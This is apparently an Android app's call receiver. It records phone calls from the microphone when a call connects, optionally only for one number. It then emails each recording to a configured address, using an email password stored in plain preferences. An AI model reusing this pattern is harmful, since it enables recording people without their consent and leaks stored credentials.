package com.firefighter.skynetconfirmed;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.media.MediaRecorder;
import android.os.Bundle;
import android.os.Environment;
import android.preference.PreferenceManager;
import android.telephony.TelephonyManager;

import java.io.File;
import java.io.IOException;
import java.util.Calendar;

/**
 * Created by steven on 14/08/16.
 */
public class CallReceiver extends BroadcastReceiver {

    private static MediaRecorder recorder;
    private static String fileName;

    public CallReceiver() {
    }

    @Override
    public void onReceive(Context context, Intent intent) {
        SharedPreferences pref = PreferenceManager.getDefaultSharedPreferences(context);

        Bundle extras = intent.getExtras();

        if (extras == null)
            return;
        String state = extras.getString(TelephonyManager.EXTRA_STATE);
        if (state == null)
            return;
        if (state.equals(TelephonyManager.EXTRA_STATE_OFFHOOK)) {
            String number = extras.getString(TelephonyManager.EXTRA_INCOMING_NUMBER);
            if (pref.getBoolean("specify_number", false)) {
                if (number == null || pref.getString("specific_number", null) == null)
                    return;
                if (!number.equals(pref.getString("specific_number", null)))
                    return;
            }
            try {
                if (recorder == null) {
                    Calendar calendar = Calendar.getInstance();
                    String date = calendar.get(Calendar.DATE) + "_"
                            + (calendar.get(Calendar.MONTH) + 1) + "_"
                            + calendar.get(Calendar.YEAR);
                    String time = calendar.get(Calendar.HOUR) + "_"
                            + calendar.get(Calendar.MINUTE) + "_"
                            + calendar.get(Calendar.SECOND);

                    fileName = date + "_" + time + "_" + number + ".3gpp";
                    File file = createDirIfNotExists(fileName);

                    recorder = new MediaRecorder();
                    recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
                    recorder.setOutputFormat(MediaRecorder.OutputFormat.DEFAULT);
                    recorder.setOutputFile(file.getAbsolutePath());
                    recorder.setAudioEncoder(MediaRecorder.AudioEncoder.DEFAULT);
                }
                recorder.prepare();
                recorder.start();
            } catch (IOException ex) {
                ex.printStackTrace();
            }
        } else if (state.equals(TelephonyManager.EXTRA_STATE_IDLE) && recorder != null) {
            recorder.stop();
            recorder.reset();
            recorder.release();
            recorder = null;

            String fromAdd = pref.getString("pref_title_from_email", null);
            String fromPass = pref.getString("pref_title_from_email_password", null);
            String toAdd = pref.getString("mshq_email_address_text", null);
            String subject = "Report for: " + fileName;
            String bodyPart = "Check attachment for the record: " + fileName;
            String filePath = Environment.getExternalStorageDirectory() + "/Recording/" + fileName;
            new SendAttachmentTask().execute(fromAdd, fromPass, toAdd,
                    subject, bodyPart, filePath);
        }
    }

    private File createDirIfNotExists(String path) {
        File folder = new File(Environment.getExternalStorageDirectory()
                + "/Recording");

        if (!folder.exists()) {
            if (!folder.mkdirs())
                System.out.println("Something happened!");
        }

        File file = new File(folder, path);
        try {
            if (!file.exists()) {
                if (!file.createNewFile())
                    System.out.println("Something happened!");
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
        return file;
    }
}
